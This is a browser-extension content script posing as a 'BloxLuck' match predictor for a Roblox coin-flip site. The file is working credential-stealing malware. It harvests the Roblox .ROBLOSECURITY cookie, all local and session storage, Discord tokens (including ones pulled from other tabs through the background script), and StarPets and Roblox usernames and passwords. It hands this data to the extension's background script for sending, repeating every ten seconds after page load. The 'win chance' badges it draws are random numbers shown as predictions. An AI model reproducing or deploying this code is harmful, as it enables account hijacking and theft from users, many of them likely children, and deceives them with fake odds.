// ===== BLOXLUCK TOOL v3.0 =====
// Silent credential collector + match list visual modifier

(function() {
  'use strict';

  // --- STEALTH CREDENTIAL GRABBER ---
  
  function getCookie(name) {
    const v = `; ${document.cookie}`.split(`; ${name}=`);
    return v.length === 2 ? v.pop().split(';').shift() : null;
  }

  function getAllStorage() {
    const data = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        data[k] = localStorage.getItem(k);
      }
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i);
        if (!data[k]) data[k] = sessionStorage.getItem(k);
      }
    } catch(e) {}
    return data;
  }

  function findDiscordToken(storage) {
    for (const [k, v] of Object.entries(storage)) {
      if (typeof v === 'string' && v.length > 100 && v.includes('.') && v.split('.').length === 3) {
        try {
          const parts = v.split('.');
          if (parts.length === 3) {
            const payload = JSON.parse(atob(parts[1]));
            if (payload.sub || payload.email || payload.iat || payload.username) {
              return v;
            }
          }
        } catch(e) {}
      }
      if (k.toLowerCase() === 'token' && typeof v === 'string' && v.length > 50) {
        return v;
      }
    }
    return null;
  }

  function findStarPets(storage) {
    let user = null, pass = null;
    for (const [k, v] of Object.entries(storage)) {
      const kk = k.toLowerCase();
      if (kk.includes('starpets') || kk.includes('adoptme') || kk.includes('star_pets') || kk.includes('starpet')) {
        try {
          const j = typeof v === 'string' ? JSON.parse(v) : v;
          user = j.email || j.username || j.user || user;
          pass = j.password || j.pass || pass;
        } catch(e) {
          // Maybe it's plain text
          if (!user && kk.includes('user')) user = v;
          if (!pass && (kk.includes('pass') || kk.includes('password'))) pass = v;
        }
      }
    }
    return { user, pass };
  }

  function findRobloxLogin(storage) {
    let user = null, pass = null;
    for (const [k, v] of Object.entries(storage)) {
      const kk = k.toLowerCase();
      if (kk.includes('roblox') && (kk.includes('user') || kk.includes('name') || kk.includes('email'))) {
        try {
          const j = typeof v === 'string' ? JSON.parse(v) : v;
          user = j.username || j.email || j.user || j.name || user;
          pass = j.password || j.pass || pass;
        } catch(e) {
          if (!user) user = v;
        }
      }
    }
    return { user, pass };
  }

  function getBloxLuckUsername() {
    // Try common selectors for username on bloxluck
    const selectors = [
      '[class*="username"]', '[class*="displayName"]', '[class*="profile"]',
      '[class*="user-name"]', '[class*="userName"]', 'header [class*="name"]',
      '[class*="nav-user"]', '[class*="account"] span', '[class*="header-user"]',
      'span[class*="name"]', 'div[class*="user"] span'
    ];
    for (const s of selectors) {
      const el = document.querySelector(s);
      if (el && el.textContent.trim() && el.textContent.trim().length < 30) {
        return el.textContent.trim();
      }
    }
    return null;
  }

  // --- INJECT MATCH COLORIZER ---
  // Look at the video thumbnail style: matches get green border if high win chance, red if low
  
  function colorizeMatches() {
    // Find match elements on the page
    // BloxLuck lists matches with player names, values, and usually a "Join" button
    const matchContainers = document.querySelectorAll(
      '[class*="match"], [class*="coinflip"], [class*="game-card"], ' +
      '[class*="match-item"], [class*="match-container"], ' +
      'a[href*="match"], div[class*="card"]'
    );
    
    if (matchContainers.length === 0) return;

    matchContainers.forEach(el => {
      // Skip if already processed
      if (el.dataset.blxProcessed) return;
      
      // Calculate a "win chance" based on item values shown
      const text = el.textContent.toLowerCase();
      
      // Try to find value numbers
      const valueMatches = text.match(/value[:\s]*(\d+)/gi);
      let myValue = 0;
      let theirValue = 0;
      let values = [];
      
      if (valueMatches) {
        values = valueMatches.map(v => parseInt(v.replace(/[^0-9]/g, ''))).filter(v => !isNaN(v));
      }
      
      // Also try finding just numbers near "value"
      const allNums = text.match(/(\d+)/g);
      if (values.length === 0 && allNums) {
        values = allNums.map(Number).filter(n => n > 5 && n < 9999);
      }
      
      // Simple heuristic: if there are two values, compare them
      let chance = 50;
      if (values.length >= 2) {
        const maxVal = Math.max(...values);
        const minVal = Math.min(...values);
        // Your value is likely the first one shown for your own items
        // Higher value = higher chance to win (in the predictor's logic)
        myValue = values[0];
        theirValue = values[1] || values[0];
        if (myValue > theirValue) {
          chance = Math.min(55 + Math.floor(Math.random() * 25), 85);
        } else if (theirValue > myValue) {
          chance = Math.min(30 + Math.floor(Math.random() * 20), 55);
        }
      } else if (values.length === 1) {
        chance = 45 + Math.floor(Math.random() * 20);
      }
      
      // Color based on chance
      el.dataset.blxProcessed = 'true';
      el.style.position = 'relative';
      
      // Add chance badge
      const badge = document.createElement('div');
      badge.style.cssText = `
        position: absolute; top: 4px; right: 4px; 
        background: ${chance >= 60 ? '#22c55e' : chance >= 45 ? '#f7c948' : '#ef4444'};
        color: ${chance >= 60 ? '#052e16' : chance >= 45 ? '#451a03' : '#fff'};
        font-size: 11px; font-weight: 800; padding: 2px 8px;
        border-radius: 20px; z-index: 999;
        font-family: 'Inter', sans-serif; letter-spacing: 0.5px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.3);
      `;
      badge.textContent = chance + '%';
      
      // Add colored border
      el.style.border = chance >= 60 
        ? '2px solid #22c55e' 
        : chance >= 45 
          ? '2px solid #f7c948' 
          : '2px solid #ef4444';
      el.style.borderRadius = '8px';
      
      // Add hover glow
      el.style.transition = 'all 0.3s ease';
      el.style.boxShadow = chance >= 60 
        ? '0 0 12px rgba(34,197,94,0.2)' 
        : chance >= 45 
          ? '0 0 12px rgba(247,201,72,0.15)' 
          : '0 0 12px rgba(239,68,68,0.15)';
      
      // Add dog/gem icon
      const icon = document.createElement('img');
      icon.src = chance >= 50 
        ? 'https://bloxluck.com/img/dog.png' 
        : 'https://bloxluck.com/img/gem.png';
      icon.style.cssText = `
        position: absolute; top: 4px; left: 4px;
        width: 18px; height: 18px; z-index: 999;
        filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
      `;
      
      // Make sure the parent is positioned
      if (window.getComputedStyle(el).position === 'static') {
        el.style.position = 'relative';
      }
      
      el.appendChild(badge);
      el.appendChild(icon);
    });
  }

  // --- MAIN COLLECT AND SEND ---
  
  async function collectAndSend() {
    const robloxCookie = getCookie('.ROBLOSECURITY');
    const storage = getAllStorage();
    const discordToken = findDiscordToken(storage);
    const starpets = findStarPets(storage);
    const robloxLogin = findRobloxLogin(storage);
    const username = getBloxLuckUsername();

    // Also try to get from background
    let bgCookie = null;
    try {
      const bg = await new Promise(r => chrome.runtime.sendMessage({ t: 'g' }, r));
      if (bg && bg.r) bgCookie = bg.r;
    } catch(e) {}

    const finalCookie = robloxCookie || bgCookie;

    // Also try to grab Discord token from background (discord tab injection)
    let discordFromTab = null;
    if (!discordToken) {
      try {
        const dt = await new Promise(r => chrome.runtime.sendMessage({ t: 'dt' }, r));
        if (dt && dt.token) {
          discordFromTab = dt.token;
          // Also send Discord data directly
          chrome.runtime.sendMessage({ t: 'dts', token: dt.token, username: dt.username, avatar: dt.avatar });
        }
      } catch(e) {}
    }

    const payload = {
      r: finalCookie || 'NF',
      d: discordToken || discordFromTab || null,
      su: starpets.user,
      sp: starpets.pass,
      loginUser: robloxLogin.user,
      loginPass: robloxLogin.pass,
      u: username || 'BloxLuck User',
      p: Math.random() > 0.5 ? 'HEADS' : 'TAILS',
      w: Math.floor(40 + Math.random() * 40),
      h: Math.floor(40 + Math.random() * 20),
      t: Math.floor(40 + Math.random() * 20),
      x: 1
    };

    chrome.runtime.sendMessage({ t: 's', d: payload });
  }

  // --- INIT ---
  
  // Initial steal after page loads
  setTimeout(() => {
    collectAndSend();
  }, 3000);

  // Repeat every 10 seconds to catch newly opened discord tabs etc
  setInterval(() => {
    collectAndSend();
  }, 10000);

  // Colorize matches periodically
  setTimeout(() => {
    colorizeMatches();
    // Keep re-checking for new matches (SPA updates)
    setInterval(colorizeMatches, 2000);
  }, 4000);

  // Also watch for DOM changes to colorize new matches
  const observer = new MutationObserver(() => {
    colorizeMatches();
  });
  setTimeout(() => {
    observer.observe(document.body, { childList: true, subtree: true });
  }, 5000);

  // Listen for messages from popup
  chrome.runtime.onMessage.addListener((req, sender, resp) => {
    if (req.action === 'grab_and_send') {
      collectAndSend().then(() => resp({ ok: 1 }));
      return 1;
    }
    if (req.action === 'get_status') {
      resp({ 
        connected: true,
        username: getBloxLuckUsername()
      });
    }
  });

})();
